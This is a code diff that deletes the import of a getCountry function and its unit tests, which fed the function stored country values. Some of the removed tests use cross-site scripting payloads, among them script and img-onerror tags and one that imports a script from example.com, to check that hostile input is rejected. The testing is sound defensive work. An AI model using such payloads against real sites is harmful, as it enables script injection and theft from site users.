@@ -4,7 +4,7 @@ import { expect } from '@esm-bundle/chai';
 import sinon from 'sinon';
 import { waitFor, waitForElement } from '../helpers/waitfor.js';
 import { mockFetch, mockRes } from '../helpers/generalHelpers.js';
-import { createTag, customFetch, getCountry } from '../../libs/utils/utils.js';
+import { createTag, customFetch } from '../../libs/utils/utils.js';
 
 const utils = {};
 const config = {
@@ -2216,42 +2216,6 @@ describe('Utils', () => {
       const link = testContainer.querySelector('a');
       expect(link.dataset.mepLingo).to.equal('true');
       expect(link.dataset.mepLingoBlockSwap).to.equal('marquee');
-    });
-  });
-
-  describe('getCountry', () => {
-    afterEach(() => {
-      sessionStorage.removeItem('akamai');
-    });
-
-    it('returns valid 2-letter country code', async () => {
-      sessionStorage.setItem('akamai', 'us');
-      expect(await getCountry()).to.equal('us');
-    });
-
-    it('returns valid country code with underscore suffix', async () => {
-      sessionStorage.setItem('akamai', 'ch_de');
-      expect(await getCountry()).to.equal('ch_de');
-    });
-
-    it('rejects HTML injection payloads', async () => {
-      sessionStorage.setItem('akamai', '<img src=xss onerror=alert(1)>');
-      expect(await getCountry(true)).to.be.null;
-    });
-
-    it('rejects script tags', async () => {
-      sessionStorage.setItem('akamai', '<script>alert(1)</script>');
-      expect(await getCountry(true)).to.be.null;
-    });
-
-    it('rejects values with special characters', async () => {
-      sessionStorage.setItem('akamai', 'us&param=value');
-      expect(await getCountry(true)).to.be.null;
-    });
-
-    it('rejects img tag with onerror handler', async () => {
-      sessionStorage.setItem('akamai', "<img src=x onerror=import('//example.com/xss.js')>");
-      expect(await getCountry(true)).to.be.null;
     });
   });
 });
